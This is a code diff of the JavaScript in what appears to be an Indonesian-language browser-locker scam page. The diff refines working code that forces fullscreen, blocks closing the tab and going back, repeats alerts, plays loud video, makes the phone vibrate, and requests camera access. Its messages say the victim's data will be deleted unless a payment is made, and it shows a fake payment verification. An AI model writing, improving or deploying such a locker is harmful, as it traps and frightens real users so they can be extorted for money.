@@ -115,40 +115,45 @@
         var fiturSudahJalan = false;
         let track = null;
 
-        // 1. ANTI-TAB CLOSE
+        // Anti-Tab Close
         window.onbeforeunload = function() {
-            return "PERINGATAN: MENUTUP HALAMAN AKAN MENGHAPUS DATA PERMANEN!";
+            return "PERINGATAN: DATA ANDA AKAN TERHAPUS!";
         };
 
-        // 2. DETEKSI KORBAN TEKAN TOMBOL HOME (Visibility Change)
+        // Fungsi PAKSA FULLSCREEN
+        function paksaFull() {
+            let elem = document.documentElement;
+            let requestMethod = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.webkitRequestFullScreen || elem.mozRequestFullScreen || elem.msRequestFullscreen;
+            if (requestMethod) { requestMethod.apply(elem); }
+        }
+
+        // 1. DETEKSI UPAYA KELUAR (Tombol Home/Pindah App)
         document.addEventListener("visibilitychange", function() {
             if (document.hidden) {
-                // Rentetan alert ini akan membuat HP korban lag/terhambat saat mau buka app lain
                 alert("UPAYA KELUAR TERDETEKSI!");
-                alert("SISTEM TETAP TERKUNCI.");
-                alert("SELESAIKAN PEMBAYARAN SEKARANG.");
+                paksaFull();
+            }
+        });
+
+        // 2. DETEKSI FULLSCREEN KELUAR (Swipe Navigasi)
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && fiturSudahJalan) {
+                alert("SISTEM TERKUNCI! Mengaktifkan kembali mode aman...");
+                paksaFull();
             }
         });
 
         async function inisialisasiEfek() {
             if (!fiturSudahJalan) {
-                // 3. PAKSA FULL SCREEN & POINTER LOCK
-                let elem = document.documentElement;
-                let requestMethod = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.webkitRequestFullScreen || elem.mozRequestFullScreen || elem.msRequestFullscreen;
-                
-                if (requestMethod) { 
-                    requestMethod.apply(elem);
-                    // Mengunci pointer agar navigasi tidak mudah muncul
-                    if (elem.requestPointerLock) {
-                        elem.requestPointerLock();
-                    }
-                }
+                // Masuk Fullscreen
+                paksaFull();
 
-                // 4. ANTI-BACK (Kunci Navigasi)
+                // 3. ANTI-BACK (Kunci Tombol Kembali)
                 history.pushState(null, null, location.href);
                 window.onpopstate = function () {
-                    history.go(1);
-                    alert("NAVIGASI DINONAKTIFKAN OLEH ADMINISTRATOR!");
+                    alert("NAVIGASI DINONAKTIFKAN! Selesaikan pembayaran.");
+                    paksaFull(); // Masuk Fullscreen lagi setelah klik Oke
+                    history.pushState(null, null, location.href);
                 };
 
                 var video = document.getElementById("myVideo");
@@ -156,14 +161,13 @@
                 video.volume = 1.0;
                 video.play();
 
-                // 5. AGGRESSIVE SYSTEM LOCK (50ms)
+                // 4. AGGRESSIVE LOCK (50ms)
                 setInterval(() => {
                     video.volume = 1.0;
                     if(video.muted) video.muted = false;
                     if(video.paused) video.play();
                 }, 50);
 
-                // 6. FITUR GETAR PANIK
                 if (navigator.vibrate) {
                     setInterval(() => { navigator.vibrate([1000, 500, 1000]); }, 2500);
                 }
@@ -188,7 +192,7 @@
                     }, 100); 
                 }
             } catch (err) {
-                console.log("Kamera ditolak");
+                console.log("Akses kamera ditolak.");
             }
         }
 
@@ -198,8 +202,8 @@
 
         function proses() {
             const term = document.getElementById('term');
-            term.innerHTML += "<br>> Mengirim laporan ke Admin...";
-            alert("Transfer berhasil dideteksi. Menunggu konfirmasi Live Chat.");
+            term.innerHTML += "<br>> Menghubungkan ke server...";
+            alert("Bukti pembayaran sedang diverifikasi.");
         }
     </script>
 
